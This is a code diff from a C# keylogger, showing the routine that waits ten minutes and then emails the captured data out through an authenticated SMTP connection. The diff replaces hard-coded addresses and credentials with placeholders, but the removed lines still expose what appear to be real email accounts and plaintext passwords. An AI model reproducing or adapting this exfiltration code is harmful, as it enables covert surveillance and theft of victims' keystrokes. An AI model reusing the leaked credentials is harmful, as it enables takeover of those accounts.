@@ -156,12 +156,12 @@ namespace keylogger
                     DateTime previous_time = DateTime.Now;
                     Thread.Sleep(600000);
                     //Console.WriteLine("Mail To");
-                    //MailAddress to = new MailAddress("sumitarora23456@gmail.com");
-		    MailAddress to = new MailAddress("sudhanshuopensource@gmail.com");
+                    //MailAddress to = new MailAddress("email@address.here");
+		    MailAddress to = new MailAddress("email@address.here");
 
                     //Console.WriteLine("Mail From");
-                    //MailAddress from = new MailAddress("sumitarora23456@gmail.com");
-		    MailAddress from = new MailAddress("sudhanshuopensource@gmail.com");
+                    //MailAddress from = new MailAddress("email@address.here");
+		    MailAddress from = new MailAddress("semail@address.here");
 
                     MailMessage mail = new MailMessage(from, to);
 
@@ -179,9 +179,9 @@ namespace keylogger
                         smtp.Port = 587;
 
                         //smtp.Credentials = new NetworkCredential(
-                        //    "sumitarora23456@gmail.com", "sumit_23rt");
+                        //    "semail@address.here", "passwordhere");
 			smtp.Credentials = new NetworkCredential(
-                            "sudhanshuopensource@gmail.com", "kr1shn@8@l@r@m");
+                            "semail@address.here", "passwordhere");
                         smtp.EnableSsl = true;
                         //Console.WriteLine("Sending email...");
                         smtp.Send(mail);
